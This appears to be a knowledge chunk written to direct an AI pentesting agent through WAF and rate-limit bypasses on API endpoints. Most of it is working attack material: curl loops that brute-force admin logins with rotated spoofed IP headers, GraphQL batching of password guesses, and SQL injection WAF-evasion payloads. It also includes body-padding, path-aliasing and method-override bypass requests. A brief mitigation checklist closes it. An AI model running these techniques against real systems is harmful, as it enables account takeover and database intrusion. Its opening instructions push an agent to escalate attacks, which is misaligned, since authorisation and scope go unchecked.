# WAF & Rate Limit Bypass Techniques — Agent Chunk 78a
> Source: CVE databases (2025-2026), Claroty Team82 WAF bypass research, WAFFLED framework, GraphQL batching research
> Purpose: Teaches the agent to identify and test rate limiting and WAF bypass vectors across API endpoints
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
Use this chunk when testing rate limiting controls or WAF protections on API endpoints. Start with IP header spoofing (lowest complexity), then escalate to GraphQL batching, WAF evasion payloads, and endpoint aliasing. Always verify which headers the target trusts before automating bypass.

---

## 1. IP Header Spoofing — Rate Limit Bypass

### Attack Principle
Many rate limiters key on client IP extracted from HTTP headers. When the application trusts proxy headers without validation, an attacker rotates header values to reset the rate limit counter.

### Spoofable Headers (Complete List)
```
X-Forwarded-For
X-Real-IP
X-Originating-IP
X-Client-IP
X-Remote-IP
X-Remote-Addr
X-Host
X-Forwarded-Host
True-Client-IP
CF-Connecting-IP
Fastly-Client-IP
X-Azure-ClientIP
X-Azure-SocketIP
X-Cluster-Client-IP
Forwarded: for=<ip>
```

### CVE Reference Table (2025-2026)

| CVE | Product | Header | Impact |
|-----|---------|--------|--------|
| CVE-2026-107271 | Gophish | X-Forwarded-For | Brute force login bypass |
| CVE-2026-84476 | AVideo | X-Forwarded-For | Authentication rate limit bypass |
| CVE-2026-54738 | Lemmy | X-Real-IP | Federation rate limit bypass |
| CVE-2026-64619 | FileCodeBox | X-Forwarded-For | File download rate limit bypass |
| CVE-2026-24000 | Fleet (osquery) | X-Forwarded-For | API rate limit bypass on enrollment |
| CVE-2026-27981 | HomeBox | X-Real-IP | Inventory API rate limit bypass |

### Reproduction Steps

**Step 1: Identify rate-limited endpoint**
```bash
# Trigger rate limit to confirm behavior
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}" https://target.com/api/login \
    -d '{"user":"test","pass":"wrong'$i'"}';
done
# Look for 429 responses
```

**Step 2: Test header spoofing**
```bash
# Rotate X-Forwarded-For to bypass
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}" https://target.com/api/login \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -d '{"user":"admin","pass":"password'$i'"}';
done
```

**Step 3: Test chained headers**
```bash
curl -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Real-IP: 10.0.0.1" \
     -H "X-Originating-IP: 192.168.1.1" \
     -H "True-Client-IP: 172.16.0.1" \
     https://target.com/api/login
```

---

## 2. GraphQL Batching — Rate Limit Bypass

### Array-Based Batching
Send multiple operations in a single HTTP request to bypass per-request rate limits:

```json
[
  {"query": "mutation { login(user:\"admin\", pass:\"pass1\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"pass2\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"pass3\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"pass4\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"pass5\") { token } }"}
]
```

### Alias-Based Batching
When array batching is blocked, use aliases within a single query:

```graphql
query {
  attempt1: login(user: "admin", pass: "pass1") { token }
  attempt2: login(user: "admin", pass: "pass2") { token }
  attempt3: login(user: "admin", pass: "pass3") { token }
  attempt4: login(user: "admin", pass: "pass4") { token }
  attempt5: login(user: "admin", pass: "pass5") { token }
}
```

### Detection
- Check `/graphql` for array support: `curl -X POST -d '[{"query":"{ __typename }"}]'`
- Most GraphQL implementations accept batched queries by default
- Rate limiters count HTTP requests, not operations within a batch

---

## 3. WAF Bypass — SQL Injection Evasion

### JSON-in-SQL (Claroty Team82 Research)
Team82 demonstrated bypassing 5 major WAFs (AWS WAF, Cloudflare, F5 BIG-IP, Imperva, Palo Alto) using JSON syntax inside SQL:

```sql
-- Standard SQLi (blocked)
' OR 1=1 --

-- JSON-in-SQL bypass (passes WAF, executes on PostgreSQL/MySQL/SQLite)
' OR JSON_EXTRACT('{"a":1}', '$.a')=1 --

-- PostgreSQL variant
' OR '{"a":1}'::jsonb->>'a'='1' --

-- MySQL variant
' OR JSON_VALUE('{"a":1}', '$.a')=1 --
```

**Why it works:** WAFs parse SQL syntax but do not understand JSON operators. The JSON functions are valid SQL that evaluates to true but does not match WAF signature patterns.

### WAFFLED Framework (1207 Bypass Variants)
Systematic WAF evasion through encoding and structural transformations:

```
# Comment insertion
SEL/**/ECT * FR/**/OM users

# Case alternation
sElEcT * fRoM users

# Double URL encoding
%2527%2520OR%25201%253D1

# Unicode normalization
＇ OR 1=1 --   (using fullwidth apostrophe U+FF07)

# Null byte insertion
SEL%00ECT * FROM users

# Whitespace substitution (tabs, vertical tabs, newlines)
SELECT%09*%0BFROM%0Ausers
```

### Cloudflare Payload-Padding Bypass
Cloudflare inspects only the first ~8KB of the request body. Pad the payload:

```bash
# Generate padding followed by malicious payload
python3 -c "print('A'*8192 + \"' OR 1=1 --\")" | \
  curl -X POST https://target.com/api/search \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "query=$(cat -)"
```

---

## 4. Endpoint Aliasing — WAF Rule Bypass

### Path Normalization Tricks
```
# Original endpoint (WAF rules applied)
/api/v1/admin/users

# Aliased paths that may bypass WAF rules
/api/v1/admin/users/
/api/v1/admin/users/.
/api/v1/./admin/./users
/api/v1/admin/users%20
/api/v1/admin/users%09
/api/v1/admin/users;
/Api/V1/Admin/Users          # Case variation
/api/v1/admin/users?
/api/v1/admin/users#
/%61%70%69/v1/admin/users     # URL-encoded path segments
```

### HTTP Method Override
```bash
# WAF blocks DELETE but allows POST
curl -X POST https://target.com/api/users/1 \
  -H "X-HTTP-Method-Override: DELETE"

# Alternative override headers
X-HTTP-Method: DELETE
X-Method-Override: DELETE
_method=DELETE  # Query parameter
```

### Content-Type Confusion
```bash
# WAF inspects application/json but not other types
curl -X POST https://target.com/api/query \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d '{"query":"' OR 1=1 --"}'

# Some APIs accept both but WAF only inspects one
curl -X POST https://target.com/api/query \
  -H "Content-Type: text/plain" \
  -d '{"query":"malicious"}'
```

---

## 5. Mitigation Checklist
- Extract client IP from the network socket, not from headers, unless behind a trusted reverse proxy
- If using proxy headers, validate against a whitelist of trusted proxy IPs
- Rate limit GraphQL by operation count, not HTTP request count
- Disable GraphQL batching if not required (`max_batch_size: 1`)
- WAFs should parse JSON operators in SQL context
- Normalize paths before applying WAF rules
- Inspect the full request body, not just the first N bytes
